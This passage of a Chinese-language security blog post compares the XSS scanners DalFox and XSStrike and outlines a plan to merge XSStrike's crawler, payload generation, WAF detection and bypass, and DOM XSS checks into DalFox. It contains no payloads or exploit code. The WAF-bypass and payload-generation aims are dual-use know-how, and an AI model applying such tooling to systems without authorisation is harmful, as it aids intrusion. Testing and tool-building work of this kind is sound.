+<li>参数挖掘：能够自动发现潜在的参数</li>
+<li>无头浏览器集成：使用 Chrome headless 进行 DOM XSS 验证</li>
+<li>详细的报告：提供多种格式的报告</li>
+<li>库模式：可以作为库集成到其他 Go 项目中</li>
+<li>WAF 检测和绕过：具有 WAF 检测和绕过功能</li>
+</ul>
+<h3 id="xsstrike-优势"><a class="markdownIt-Anchor" href="#xsstrike-优势"></a> XSStrike 优势</h3>
+<ul>
+<li>高级有效载荷生成：能够生成更复杂的有效载荷</li>
+<li>更强的 WAF 绕过能力：有专门的 WAF 绕过模块</li>
+<li>DOM 分析：更深入的 DOM 分析</li>
+<li>爬虫功能：能够爬取网站发现更多的注入点</li>
+<li>上下文感知的有效载荷：根据注入点的上下文生成有效载荷</li>
+</ul>
+<h2 id="整合方案"><a class="markdownIt-Anchor" href="#整合方案"></a> 整合方案</h2>
+<h3 id="基础架构选择"><a class="markdownIt-Anchor" href="#基础架构选择"></a> 基础架构选择</h3>
+<p>建议以 DalFox 为基础架构进行整合，原因如下：</p>
+<ul>
+<li>Go 语言性能更好，并发处理能力强</li>
+<li>DalFox 的模块化设计更适合扩展</li>
+<li>DalFox 已经有良好的命令行界面和库模式支持</li>
+</ul>
+<h3 id="需要整合的功能"><a class="markdownIt-Anchor" href="#需要整合的功能"></a> 需要整合的功能</h3>
+<p>大致如下：</p>
+<ol>
+<li>从 XSStrike 整合到 DalFox 的功能；<br />
+高级有效载荷生成；<br />
+增强的 WAF 检测和绕过；<br />
+爬虫功能；<br />
+上下文感知的有效载荷生成；</li>
+<li>命令行接口扩展。</li>
+<li>配置结构扩展</li>
+</ol>
+<h3 id="具体实现步骤"><a class="markdownIt-Anchor" href="#具体实现步骤"></a> 具体实现步骤</h3>
+<ul>
+<li>
+<p>创建爬虫模块</p>
+<ul>
+<li>基于 XSStrike 的 <a class="link"   target="_blank" rel="noopener" href="http://crawl.py" >crawl.py<i class="fas fa-external-link-alt"></i></a> 创建 Go 版本的爬虫</li>
+<li>集成到 DalFox 的扫描流程中</li>
+</ul>
+</li>
+<li>
+<p>增强有效载荷生成</p>
+<ul>
+<li>分析 XSStrike 的有效载荷生成逻辑</li>
+<li>将其移植到 DalFox 的有效载荷生成模块中</li>
+<li>添加上下文感知的有效载荷生成</li>
+</ul>
+</li>
+<li>
+<p>增强 WAF 检测和绕过</p>
+<ul>
+<li>整合 XSStrike 的 WAF 检测逻辑</li>
+<li>改进 DalFox 的 WAF 绕过策略</li>
+</ul>
+</li>
+<li>
+<p>DOM XSS 检测增强</p>
+<ul>
+<li>结合两个项目的 DOM XSS 检测逻辑</li>
+<li>增强 DalFox 的 headless 浏览器检测功能</li>
+</ul>
+</li>
+<li>
+<p>报告生成改进</p>
+<ul>
+<li>整合两个项目的报告格式</li>
+<li>提供更详细的漏洞信息</li>
+</ul>
+</li>
+</ul>
+<p>通过以 DalFox 为基础，整合 XSStrike 的优势功能，可以创建一个更强大、更全面的 XSS 扫描工具。主要整合点包括：</p>
+<ol>
+<li>
+<p>爬虫功能</p>
+</li>
+<li>
+<p>高级有效载荷生成</p>
+</li>
+<li>
+<p>增强的 WAF 检测和绕过</p>
+</li>
+<li>
+<p>上下文感知的有效载荷生成</p>
+</li>
+</ol>
+<p>这种整合将结合 Go 语言的高性能和 XSStrike 的高级功能，为用户提供更好的 XSS 扫描体验。建议从实现爬虫模块开始，然后逐步整合其他功能。</p>
+</script></li></ul>
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/web%E6%BC%8F%E6%B4%9E/">web漏洞</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/02/12/%E6%BA%AF%E6%BA%90-%E7%AE%80/"
+                                   title="溯源_简"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">溯源_简</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text"> 项目分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xsstrike"><span class="nav-text"> XSStrike</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3-xsstrikepy"><span class="nav-text"> 主程序入口 (xsstrike.py)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E6%A3%80%E6%B5%8B%E9%AA%8C%E8%AF%81%E6%A8%A1%E5%9D%97-corecheckerpy"><span class="nav-text"> XSS检测验证模块 (core&#x2F;checker.py)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%88%E7%AB%AF%E9%A2%9C%E8%89%B2%E8%BE%93%E5%87%BA%E6%A8%A1%E5%9D%97-corecolorspy"><span class="nav-text"> 终端颜色输出模块 (core&#x2F;colors.py)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE%E6%A8%A1%E5%9D%97-coreconfigpy"><span class="nav-text"> 全局配置模块 (core&#x2F;config.py)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom-xss%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97-coredompy"><span class="nav-text"> DOM XSS扫描模块 (core&#x2F;dom.py)</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;2025
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">Ehiyor</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+        
+        <div class="deploy-info info-item">
+            
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
+            
+        </div>
+    
+
+    
+
+    
+
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script> -->
+
+<!-- <meting-js
+    server="netease"
+    type="playlist"
+    id="7828112982"
+    fixed="true"
+    autoplay="false"
+    order="random"
+    theme="#42b983">
+</meting-js> -->
+
+
+<!-- 保持播放器组件 -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css">
+<script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
+
+<!-- 使用 id 来指定网易云歌单 ID，使用 class 作为播放器的唯一标识符 -->
+<meting-js
+    id="7828112982"         
+    class="global-music"    
+    server="netease"
+    type="playlist"
+    fixed="true"
+    autoplay="false"
+    order="random"
+    theme="#42b983"
+    style="position: fixed; bottom: 20px; left: 20px; z-index: 9999;">
+</meting-js>
+
+
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A1%B9%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text"> 项目分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xsstrike"><span class="nav-text"> XSStrike</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BB%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3-xsstrikepy"><span class="nav-text"> 主程序入口 (xsstrike.py)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss%E6%A3%80%E6%B5%8B%E9%AA%8C%E8%AF%81%E6%A8%A1%E5%9D%97-corecheckerpy"><span class="nav-text"> XSS检测验证模块 (core&#x2F;checker.py)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%88%E7%AB%AF%E9%A2%9C%E8%89%B2%E8%BE%93%E5%87%BA%E6%A8%A1%E5%9D%97-corecolorspy"><span class="nav-text"> 终端颜色输出模块 (core&#x2F;colors.py)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E9%85%8D%E7%BD%AE%E6%A8%A1%E5%9D%97-coreconfigpy"><span class="nav-text"> 全局配置模块 (core&#x2F;config.py)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dom-xss%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97-coredompy"><span class="nav-text"> DOM XSS扫描模块 (core&#x2F;dom.py)</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+<script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/toggle-theme.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/code-block.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/local-search.js"></script>
+
+
+<!-- lazyload -->
+
+    <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/lazyload.js"></script>
+
+
+<div class="pjax">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/post-helper.js"></script>
+
+        <!-- toc -->
+        
+            <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/toc.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/post/share.js"></script>
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+    <!-- <script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+        });
+    });
+</script> -->
+
+
+
+
+
+<script src="//unpkg.com/hexo-theme-keep@4.2.5/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+        });
+
+        // 在页面切换时只刷新播放器组件
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart()
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd()
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'))
+            KEEP.initExecute()
+
+            // 重新加载播放器组件，确保刷新速度快
+            let oldMeting = document.querySelector('.global-music');
+            if (oldMeting) {
+                let newMeting = oldMeting.cloneNode();
+                oldMeting.parentNode.replaceChild(newMeting, oldMeting);
+            }
+        });
+    });
+</script>
+
+
+
+
+    
+        
+    
+
+</body>
+
+</html>
